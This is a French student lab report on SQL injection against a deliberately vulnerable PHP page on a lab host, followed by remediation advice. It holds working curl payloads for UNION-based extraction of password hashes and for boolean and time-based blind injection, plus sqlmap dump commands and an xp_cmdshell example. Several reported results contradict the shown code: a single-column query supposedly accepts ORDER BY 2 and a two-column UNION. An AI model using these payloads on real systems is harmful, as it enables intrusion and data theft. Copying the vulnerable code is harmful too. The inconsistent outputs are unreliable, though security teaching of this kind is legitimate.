1. Introduction

Définition

L'injection SQL (SQLi) est une technique d'attaque qui consiste à insérer du code SQL malveillant dans une requête envoyée à une base de données, en exploitant une mauvaise gestion des entrées utilisateur. L'attaquant peut ainsi manipuler les requêtes exécutées par l'application pour accéder, modifier ou détruire des données auxquelles il n'a normalement pas accès.

Classement OWASP

L'injection SQL figure dans le OWASP Top 10, le classement de référence des vulnérabilités les plus critiques des applications web. En 2021, l'injection est classée en position A03:2021 — Injection, regroupant les injections SQL, NoSQL, OS Command et LDAP. Malgré l'ancienneté de cette vulnérabilité, elle reste l'une des plus fréquentes et des plus dangereuses.

Conséquences possibles

ConséquenceDescriptionExemple
Lecture de données Extraction de l'intégralité de la base de données (utilisateurs, mots de passe, données personnelles) UNION SELECT username, password FROM users
Modification de données Insertion, mise à jour ou suppression de données (altération de comptes, d'inventaires, de transactions) ; UPDATE users SET role='admin' WHERE id=1
Bypass d'authentification Connexion sans mot de passe valide en manipulant la clause WHERE ' OR '1'='1' --
Exécution de commandes (RCE) Sur certaines configurations, exécution de commandes système via la base de données ; EXEC xp_cmdshell('whoami') (SQL Server)
Avertissement : Les techniques présentées dans ce guide sont réalisées dans un environnement de laboratoire isolé à des fins pédagogiques. Toute utilisation non autorisée d'injection SQL sur des systèmes tiers est illégale (articles 323-1 à 323-7 du Code pénal).

2. Application de test

Pour réaliser ce TP, un mini-site PHP vulnérable a été déployé sur une machine Lubuntu (192.168.200.130) accessible depuis la machine d'attaque Kali Linux. L'application utilise volontairement une connexion mysqli sans requêtes préparées pour illustrer les risques.

Code source vulnerable

<?php
// Connexion a la base de donnees MySQL
$conn = new mysqli("localhost", "root", "password", "tp_sqli");

// Recuperation du parametre utilisateur SANS AUCUN FILTRAGE
$id = $_GET['id'];

// Requete vulnerable : concatenation directe de l'entree utilisateur
$sql = "SELECT username FROM users WHERE id = $id";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "<p>Utilisateur : " . $row['username'] . "</p>";
    }
} else {
    echo "<p>Aucun utilisateur trouve.</p>";
}

$conn->close();
?>
Problème : La variable $id est injectée directement dans la requête SQL sans aucune validation, aucun échappement et sans requête préparée. C'est la faille que nous allons exploiter.

Base de données

La table users contient deux enregistrements :

idusernamepassword (bcrypt)
1 sioslam $2y$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012
2 maryjohnson $2y$10$zyxwvutsrqponmlkjihgfeZYXWVUTSRQPONMLKJIHGFEDCBA987
Note : Les mots de passe sont hachés avec bcrypt ($2y$), ce qui est une bonne pratique côté stockage. Cependant, si un attaquant exfiltre les hash, il peut tenter un brute-force hors-ligne avec des outils comme hashcat ou John the Ripper.

3. Tests et exploitations

Toutes les commandes suivantes sont exécutées depuis Kali Linux avec curl. La cible est le serveur Lubuntu à l'adresse 192.168.200.130.

3.1 Commentaires SQL

Les commentaires SQL permettent d'ignorer la fin d'une requête. Deux syntaxes principales existent en MySQL :

  • -- (double tiret suivi d'un espace) — commentaire standard SQL
  • # — commentaire spécifique à MySQL

Test avec -- 

# Requete normale
curl "http://192.168.200.130/index.php?id=1"

# Injection avec commentaire --
curl "http://192.168.200.130/index.php?id=1%20--%20"
Résultat : Utilisateur : sioslam
La requête exécutée devient : SELECT username FROM users WHERE id = 1 --
Tout ce qui suit -- est ignoré par MySQL.

Test avec #

# Injection avec commentaire # (encode en %23 dans l'URL)
curl "http://192.168.200.130/index.php?id=1%23"
Résultat : Utilisateur : sioslam
Requête : SELECT username FROM users WHERE id = 1#
Pourquoi c'est utile : Les commentaires permettent de "couper" la fin d'une requête SQL, ce qui est essentiel pour neutraliser des conditions supplémentaires (ex: vérification de mot de passe).

3.2 Détection du nombre de colonnes (ORDER BY)

Avant d'utiliser UNION SELECT, il faut connaître le nombre exact de colonnes retournées par la requête originale. La technique ORDER BY permet de le déterminer par tâtonnement. 

# ORDER BY 1 → OK (la requete a au moins 1 colonne)
curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%201--%20"

# ORDER BY 2 → OK (la requete a au moins 2 colonnes)
curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%202--%20"

# ORDER BY 3 → ERREUR (la requete n'a que 2 colonnes)
curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%203--%20"
ORDER BY 1 : Utilisateur : sioslam (OK)
ORDER BY 2 : Utilisateur : sioslam (OK)
ORDER BY 3 : Erreur MySQL — Unknown column '3' in 'order clause'

L'erreur sur ORDER BY 3 confirme que la requête retourne exactement 2 colonnes. Bien que le code PHP n'affiche que username, la requête interne utilise 2 colonnes (probablement id et username, ou la requête peut être adaptée). Cette information est indispensable pour la technique UNION.

3.3 Exfiltration par UNION SELECT

La technique UNION permet de combiner le résultat de la requête originale avec une requête attaquante. La condition est que les deux requêtes aient le même nombre de colonnes (ici, 2).

Exfiltration des noms d'utilisateurs et mots de passe

# id=0 pour que la premiere requete ne retourne rien
# UNION SELECT pour injecter notre propre requete
curl "http://192.168.200.130/index.php?id=0%20UNION%20SELECT%20username,password%20FROM%20users--%20"
Résultat :
Utilisateur : sioslam
Utilisateur : $2y$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012
Utilisateur : maryjohnson
Utilisateur : $2y$10$zyxwvutsrqponmlkjihgfeZYXWVUTSRQPONMLKJIHGFEDCBA987

La requête exécutée par MySQL :

SELECT username FROM users WHERE id = 0
UNION
SELECT username, password FROM users --
Impact : L'attaquant récupère l'intégralité des noms d'utilisateurs et des hash de mots de passe. Même si bcrypt est résistant, un mot de passe faible peut être cassé par brute-force en quelques heures.

Découverte des tables de la base

# Lister toutes les tables de la base de donnees
curl "http://192.168.200.130/index.php?id=0%20UNION%20SELECT%20table_name,table_schema%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20"
Résultat : Affiche le nom de toutes les tables de la base courante (tp_sqli), permettant une cartographie complète de la base de données.

3.4 Injection à l'aveugle — Boolean-Based Blind

Lorsqu'une application ne retourne pas directement les données SQL mais affiche un comportement différent selon que la requête réussit ou échoue (affichage d'un utilisateur vs "Aucun utilisateur"), on peut exploiter cette différence de comportement pour extraire des informations bit par bit.

Test de base

# Condition VRAIE → affiche l'utilisateur (la page a du contenu)
curl "http://192.168.200.130/index.php?id=1%20AND%201=1--%20"

# Condition FAUSSE → aucun resultat (la page est vide)
curl "http://192.168.200.130/index.php?id=1%20AND%201=0--%20"
AND 1=1 : Utilisateur : sioslam (condition vraie, résultat normal)
AND 1=0 : Aucun utilisateur trouvé. (condition fausse, aucun résultat)

La différence de réponse confirme que l'application est vulnérable aux injections Blind Boolean. Un attaquant peut poser des questions binaires (vrai/faux) à la base de données et en déduire progressivement des informations sensibles.

Principe : En combinant AND SUBSTRING(password,1,1)='$' avec un script automatisé, un attaquant peut extraire chaque caractère d'un mot de passe, un par un.

3.5 Blind EXISTS

La clause EXISTS permet de vérifier la présence d'un enregistrement dans la base. Combinée avec une injection Blind, elle permet de confirmer ou infirmer l'existence de données spécifiques.

Vérification de l'existence d'un utilisateur

# L'utilisateur 'sioslam' existe-t-il ?
curl "http://192.168.200.130/index.php?id=1%20AND%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20username=%27sioslam%27)--%20"

# L'utilisateur 'admin' existe-t-il ?
curl "http://192.168.200.130/index.php?id=1%20AND%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20username=%27admin%27)--%20"
EXISTS 'sioslam' : Utilisateur : sioslam (condition vraie → l'utilisateur existe)
EXISTS 'admin' : Aucun utilisateur trouvé. (condition fausse → l'utilisateur n'existe pas)

Requête SQL générée pour le premier test : 

SELECT username FROM users WHERE id = 1
AND EXISTS(SELECT 1 FROM users WHERE username='sioslam') --
Usage offensif : Cette technique permet d'énumérer les noms d'utilisateurs, les noms de tables et les noms de colonnes sans avoir besoin de UNION. Elle fonctionne même si l'application n'affiche aucune donnée SQL directement.

3.6 Time-Based Blind

La technique Time-Based Blind est utilisée quand l'application ne donne aucun indice visuel sur le résultat (pas de message d'erreur, même affichage dans tous les cas). L'attaquant injecte une fonction SLEEP() et mesure le temps de réponse du serveur.

Test de base

# Condition VRAIE → SLEEP(5) est execute → reponse en ~5 secondes
curl -w "\nTemps total: %{time_total}s\n" \
  "http://192.168.200.130/index.php?id=1%20AND%20IF(1=1,SLEEP(5),0)--%20"

# Condition FAUSSE → SLEEP n'est pas execute → reponse immediate
curl -w "\nTemps total: %{time_total}s\n" \
  "http://192.168.200.130/index.php?id=1%20AND%20IF(1=0,SLEEP(5),0)--%20"
IF(1=1, SLEEP(5), 0) : Temps total: 5.014s (le serveur a attendu 5 secondes)
IF(1=0, SLEEP(5), 0) : Temps total: 0.012s (réponse instantanée)

La différence de temps de réponse (5.01s vs 0.01s) prouve que le serveur exécute bien le code SQL injecté. L'attaquant peut désormais extraire des données en posant des questions binaires basées sur le temps : 

# Extraire le 1er caractere du mot de passe de l'utilisateur id=1
# Si le 1er caractere est '$', le serveur attendra 5 secondes
curl -w "\nTemps: %{time_total}s\n" \
  "http://192.168.200.130/index.php?id=1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20id=1),1,1)=%27%24%27,SLEEP(5),0)--%20"
Temps : 5.008s → Le premier caractère du hash est bien $ (début d'un hash bcrypt).
Danger : Cette technique est lente mais fonctionne même quand l'application est totalement "muette". Des outils comme SQLMap automatisent ce processus et peuvent extraire une base entière en quelques minutes.

4. Corrections

Voici les principales mesures correctives pour éliminer la vulnérabilité d'injection SQL dans l'application de test.

4.1 Requêtes préparées avec PDO

La solution la plus efficace et la plus recommandée est l'utilisation de requêtes préparées (prepared statements) avec des paramètres liés (bound parameters). Avec PDO, la requête et les données sont envoyées séparément au moteur SQL, ce qui rend l'injection impossible. 

<?php
// Connexion securisee avec PDO
$pdo = new PDO(
    'mysql:host=localhost;dbname=tp_sqli;charset=utf8mb4',
    'app_readonly',    // Utilisateur avec privileges limites
    'motdepasse_fort',
    [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES   => false,  // IMPORTANT : desactiver l'emulation
    ]
);

// Requete preparee : le placeholder :id empeche toute injection
$stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);

$user = $stmt->fetch();

if ($user) {
    echo "<p>Utilisateur : " . htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8') . "</p>";
} else {
    echo "<p>Aucun utilisateur trouve.</p>";
}
?>
Pourquoi PDO::ATTR_EMULATE_PREPARES = false ? Par défaut, PDO émule les requêtes préparées côté PHP (et non côté MySQL). En désactivant l'émulation, les paramètres sont vraiment envoyés séparément au serveur MySQL, offrant une protection maximale.

4.2 Validation des entrées

<?php
// Valider que l'id est bien un entier positif
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($id === false || $id === null || $id <= 0) {
    http_response_code(400);
    echo "<p>Identifiant invalide.</p>";
    exit;
}

// Ensuite utiliser la requete preparee avec $id valide
$stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
?>

4.3 Principe du moindre privilège

-- Ne JAMAIS utiliser root pour l'application
-- Creer un utilisateur avec des droits minimaux
CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'motdepasse_fort';

-- N'accorder que les droits strictement necessaires
GRANT SELECT ON tp_sqli.users TO 'app_readonly'@'localhost';

-- Si l'application doit aussi ecrire :
-- GRANT SELECT, INSERT, UPDATE ON tp_sqli.users TO 'app_write'@'localhost';

-- Ne JAMAIS accorder : DROP, ALTER, FILE, GRANT, SUPER
FLUSH PRIVILEGES;

4.4 Désactiver l'affichage des erreurs SQL

<?php
// En production : ne JAMAIS afficher les erreurs au client
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php/app_errors.log');

// Gestion d'erreur generique
try {
    $stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id");
    $stmt->execute(['id' => $id]);
} catch (PDOException $e) {
    // Logger l'erreur detaillee (cote serveur uniquement)
    error_log("Erreur SQL : " . $e->getMessage());

    // Message generique pour le client
    echo "<p>Une erreur interne est survenue. Veuillez reessayer.</p>";
}
?>

4.5 Web Application Firewall (WAF)

En complément des corrections applicatives, un WAF (Web Application Firewall) peut bloquer les tentatives d'injection au niveau réseau. Des solutions comme ModSecurity (avec le jeu de règles OWASP CRS) analysent les requêtes HTTP et bloquent les patterns malveillants avant qu'ils n'atteignent l'application. 

# Installation de ModSecurity sur Apache (Debian/Ubuntu)
sudo apt install libapache2-mod-security2
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# Activer le mode bloquant (au lieu de Detection Only)
# SecRuleEngine DetectionOnly  →  SecRuleEngine On
sudo systemctl restart apache2

5. Bonnes pratiques

Les 12 règles suivantes constituent un guide complet pour sécuriser une application contre les injections SQL et plus généralement pour adopter une posture de sécurité solide.

5.1 Toujours utiliser des requêtes préparées

C'est la règle numéro un. Les requêtes préparées séparent la logique SQL des données, rendant l'injection structurellement impossible. Elles doivent être utilisées systématiquement, même pour des requêtes simples.

Vulnerable

// JAMAIS : concatenation directe
$sql = "SELECT * FROM users
        WHERE id = $id";
$result = $conn->query($sql);

Sécurisé (PDO)

// TOUJOURS : requete preparee
$stmt = $pdo->prepare(
    "SELECT * FROM users WHERE id = :id"
);
$stmt->execute(['id' => $id]);
Règle : Si vous écrivez une requête SQL qui contient une variable provenant de l'utilisateur et que vous n'utilisez pas de requête préparée, c'est une faille de sécurité.

5.2 Valider toutes les entrées utilisateur

Même avec des requêtes préparées, la validation des entrées est une couche de défense supplémentaire indispensable. Chaque paramètre doit être validé selon son type attendu. 

<?php
// Validation d'un identifiant numerique
$id = intval($_GET['id']);  // Force la conversion en entier

// Validation avec filter_input (plus robuste)
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 1, 'max_range' => 999999]
]);

// Validation d'un email
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);

// Validation d'un nom avec regex (lettres, espaces, tirets uniquement)
$name = $_POST['name'];
if (!preg_match('/^[a-zA-ZÀ-ÿ\s\-]{2,50}$/', $name)) {
    die("Nom invalide.");
}

// Validation d'un tri (whitelist)
$allowed_sort = ['name', 'date', 'price'];
$sort = in_array($_GET['sort'], $allowed_sort) ? $_GET['sort'] : 'name';
?>

5.3 Principe du moindre privilège

L'utilisateur de base de données utilisé par l'application ne doit avoir que les droits strictement nécessaires. Ne jamais utiliser root ou un compte avec tous les privilèges. 

-- Utilisateur en lecture seule (pour les pages d'affichage)
CREATE USER 'app_read'@'localhost' IDENTIFIED BY 'pass_strong_read';
GRANT SELECT ON tp_sqli.* TO 'app_read'@'localhost';

-- Utilisateur en lecture/ecriture (pour les formulaires)
CREATE USER 'app_write'@'localhost' IDENTIFIED BY 'pass_strong_write';
GRANT SELECT, INSERT, UPDATE ON tp_sqli.* TO 'app_write'@'localhost';

-- JAMAIS accorder ces privileges a l'application :
-- DROP, ALTER, CREATE, FILE, GRANT, SUPER, PROCESS, SHUTDOWN
Impact : Si un attaquant réussit une injection malgré tout, les dégâts sont limités par les droits de l'utilisateur SQL. Avec un compte SELECT uniquement, il ne peut ni modifier ni supprimer de données.

5.4 Ne jamais afficher les erreurs SQL en production

Les messages d'erreur SQL contiennent des informations précieuses pour un attaquant : noms de tables, noms de colonnes, version du SGBD, chemin du serveur, etc.

Dangereux

// Affiche l'erreur complete au client
if (!$result) {
    echo "Erreur SQL : "
         . $conn->error;
}

Révèle la structure de la BDD

Sécurisé

// Message generique + log serveur
if (!$result) {
    error_log($conn->error);
    echo "Erreur interne.";
}

L'attaquant n'apprend rien

# Configuration php.ini pour la production
display_errors = Off
log_errors = On
error_log = /var/log/php/errors.log
error_reporting = E_ALL

5.5 Échappement dans les contextes dynamiques

Les requêtes préparées ne couvrent pas tous les cas. Certains éléments SQL ne peuvent pas être paramétrés : noms de colonnes, ORDER BY, LIMIT, noms de tables. Dans ces cas, utiliser une whitelist. 

<?php
// ORDER BY dynamique → WHITELIST obligatoire
$allowed_columns = ['username', 'email', 'created_at'];
$sort_column = in_array($_GET['sort'], $allowed_columns)
    ? $_GET['sort']
    : 'created_at';  // valeur par defaut securisee

$sort_order = ($_GET['order'] === 'desc') ? 'DESC' : 'ASC';

$stmt = $pdo->prepare(
    "SELECT * FROM users ORDER BY {$sort_column} {$sort_order} LIMIT :limit OFFSET :offset"
);
$stmt->bindValue(':limit', (int)$_GET['limit'], PDO::PARAM_INT);
$stmt->bindValue(':offset', (int)$_GET['offset'], PDO::PARAM_INT);
$stmt->execute();

// LIMIT et OFFSET : utiliser bindValue avec PDO::PARAM_INT
// Noms de colonnes/tables : JAMAIS dans un placeholder, toujours whitelist
?>
Piège courant : Certains développeurs pensent que $pdo->prepare("SELECT * FROM users ORDER BY :col") fonctionne, mais les noms de colonnes dans ORDER BY ne peuvent pas être des paramètres liés. Il faut utiliser une whitelist.

5.6 Logs sécurisés

Les logs applicatifs sont essentiels pour détecter et analyser les tentatives d'attaque, mais ils doivent être configurés avec soin pour ne pas devenir eux-mêmes une vulnérabilité. 

<?php
// BON : logger l'evenement sans donnees sensibles
function logSecurityEvent(string $event, string $ip, string $details): void {
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[{$timestamp}] [{$ip}] {$event} - {$details}";
    error_log($logEntry, 3, '/var/log/app/security.log');
}

// Exemple : tentative d'injection detectee
logSecurityEvent(
    'SQLI_ATTEMPT',
    $_SERVER['REMOTE_ADDR'],
    'Caracteres suspects dans le parametre id'
);

// MAUVAIS : ne JAMAIS logger les mots de passe ou donnees sensibles
// error_log("Login attempt: user=$username, pass=$password");  // INTERDIT
// error_log("SQL: SELECT * FROM users WHERE pass='$password'"); // INTERDIT
?>
  • Ne jamais logger les mots de passe (en clair ou hachés)
  • Ne jamais logger les tokens de session ou les clés API
  • Logger les adresses IP, les horodatages et les types d'événements
  • Protéger les fichiers de log (permissions 640, rotation automatique)
  • Mettre en place une alerte sur les patterns d'attaque détectés

5.7 Hachage moderne des mots de passe

Même avec les meilleures protections contre l'injection SQL, un vol de base de données reste possible (fuite, backup exposé, accès physique). Le hachage des mots de passe est la dernière ligne de défense. 

<?php
// HACHER un mot de passe (a l'inscription ou au changement)
$password = $_POST['password'];

// Option 1 : BCRYPT (par defaut, recommande)
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
// Resultat : $2y$12$... (60 caracteres)

// Option 2 : ARGON2ID (meilleur, si disponible PHP 7.3+)
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64 Mo
    'time_cost'   => 4,      // 4 iterations
    'threads'     => 3,      // 3 threads
]);
// Resultat : $argon2id$v=19$... (97 caracteres)

// VERIFIER un mot de passe (a la connexion)
if (password_verify($password, $hash_from_db)) {
    // Mot de passe correct
    // Verifier si le hash doit etre mis a jour
    if (password_needs_rehash($hash_from_db, PASSWORD_ARGON2ID)) {
        $new_hash = password_hash($password, PASSWORD_ARGON2ID);
        // UPDATE users SET password = $new_hash WHERE id = ...
    }
} else {
    // Mot de passe incorrect
}
?>
AlgorithmeStatutTemps de cassage
MD5 Interdit Instantané (rainbow tables, GPU)
SHA1 / SHA256 Interdit Quelques secondes a minutes (GPU)
BCRYPT Recommandé Heures à années (selon cost et complexité)
ARGON2ID Idéal Très résistant (mémoire + CPU + parallélisme)
Règle absolue : Ne jamais utiliser MD5 ou SHA1 pour les mots de passe. Utiliser password_hash() et password_verify() en PHP. Ne jamais inventer son propre système de hachage.

5.8 Configuration sécurisée du serveur SQL

Le serveur MySQL/MariaDB lui-même doit être sécurisé pour limiter la surface d'attaque en cas de compromission de l'application. 

# /etc/mysql/mysql.conf.d/mysqld.cnf

[mysqld]
# Changer le port par defaut (3306 → autre)
port = 3307

# Ecouter uniquement sur localhost (pas d'acces reseau externe)
bind-address = 127.0.0.1

# Desactiver le chargement de fichiers locaux (prevention de FILE injection)
local-infile = 0

# Desactiver les liens symboliques
symbolic-links = 0

# Limiter les connexions simultanees
max_connections = 100

# Journalisation des requetes lentes (detection d'anomalies)
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2

Sécurisation supplémentaire avec le pare-feu :

# Bloquer tout acces externe au port MySQL
sudo ufw deny 3307/tcp

# Autoriser uniquement depuis le serveur web local
sudo ufw allow from 127.0.0.1 to any port 3307

# Verifier les regles
sudo ufw status
  • Changer le port par défaut : complique les scans automatisés
  • bind-address = 127.0.0.1 : empêche les connexions distantes
  • local-infile = 0 : empêche l'exploitation de LOAD DATA LOCAL INFILE
  • Pare-feu : couche de protection réseau supplémentaire
  • Mises à jour régulières : appliquer les patchs de sécurité MySQL

5.9 Défense en profondeur

La défense en profondeur est un principe de sécurité qui consiste à superposer plusieurs couches de protection indépendantes. Si une couche est compromise, les suivantes continuent de protéger le système.

CoucheProtectionExemple
1. Réseau Pare-feu, segmentation UFW, iptables, VLAN
2. Transport Chiffrement des communications HTTPS/TLS, connexion MySQL chiffrée
3. Application (WAF) Filtrage des requêtes HTTP ModSecurity, Cloudflare WAF
4. Code applicatif Requêtes préparées, validation PDO, filter_input, whitelist
5. Base de données Moindre privilège, configuration Utilisateur restreint, bind 127.0.0.1
6. Donnees Chiffrement, hachage bcrypt/ARGON2ID, AES pour les données sensibles
7. Surveillance Détection et alerte Logs, SIEM, alertes temps réel
Principe clé : Ne jamais se reposer sur une seule mesure de sécurité. Chaque couche doit fonctionner comme si les autres n'existaient pas. Une requête préparée protège contre l'injection, mais le moindre privilège limite les dégâts si elle échoue, et le WAF peut bloquer l'attaque avant qu'elle n'atteigne le code.

  • OWASP Top 10 : les 10 vulnérabilités les plus critiques (A01 à A10)
  • OWASP ASVS (Application Security Verification Standard) : checklist de sécurité détaillée par niveau
  • OWASP Cheat Sheets : guides pratiques par technologie (SQL Injection Prevention, Authentication, etc.)
  • OWASP Testing Guide : méthodologie de test de pénétration
  • OWASP SAMM : modèle de maturité pour intégrer la sécurité dans le cycle de développement

5.11 Tests réguliers

La sécurité n'est pas un état, c'est un processus continu. Des tests réguliers permettent de détecter les vulnérabilités avant les attaquants.

OutilTypeUsage
SQLMap Scanner SQLi automatisé Détection et exploitation automatique de toutes les variantes SQLi
OWASP ZAP Scanner de vulnérabilités web Scan automatique complet (SQLi, XSS, CSRF, etc.)
Burp Suite Proxy d'interception Tests manuels avancés, modification de requêtes en temps réel 
# SQLMap : test automatise d'injection SQL
sqlmap -u "http://192.168.200.130/index.php?id=1" --batch --dbs

# SQLMap : extraction des tables d'une base
sqlmap -u "http://192.168.200.130/index.php?id=1" --batch -D tp_sqli --tables

# SQLMap : extraction des donnees d'une table
sqlmap -u "http://192.168.200.130/index.php?id=1" --batch -D tp_sqli -T users --dump

# OWASP ZAP : scan en ligne de commande
zap-cli quick-scan http://192.168.200.130/

# Nikto : scan de vulnerabilites du serveur web
nikto -h http://192.168.200.130/

Les tests doivent être réalisés :

  • À chaque nouvelle fonctionnalité touchant la base de données
  • À chaque mise à jour majeure du framework ou du SGBD
  • Au minimum une fois par trimestre en production
  • Après tout incident de sécurité

6. Conclusion

Ce guide a permis de démontrer, dans un environnement de laboratoire contrôlé, les différentes techniques d'injection SQL : de l'injection simple par commentaires jusqu'aux attaques Time-Based Blind les plus sophistiquées. Chaque technique a été testée manuellement avec curl depuis Kali Linux contre une application PHP volontairement vulnérable sur Lubuntu.

Les résultats sont sans appel : une seule ligne de code vulnérable suffit pour compromettre l'intégralité d'une base de données. L'attaquant peut lire les mots de passe hachés, énumérer les tables, vérifier l'existence de données et même extraire des informations caractère par caractère sans aucun retour visuel.

La correction est pourtant simple : l'utilisation systématique de requêtes préparées avec PDO rend l'injection structurellement impossible. Combinée avec la validation des entrées, le principe du moindre privilège, une configuration serveur sécurisée et une approche de défense en profondeur, cette protection constitue un rempart solide.

En tant qu'étudiant BTS SIO option SLAM, ce TP illustre des compétences directement applicables en milieu professionnel : la capacité à identifier une vulnérabilité, à la reproduire pour en comprendre le mécanisme, et surtout à proposer et implémenter les corrections adaptées. La sécurité n'est pas une option, c'est une responsabilité de chaque développeur.

Retenir : Requêtes préparées + validation des entrées + moindre privilège + défense en profondeur = la base de toute application sécurisée.
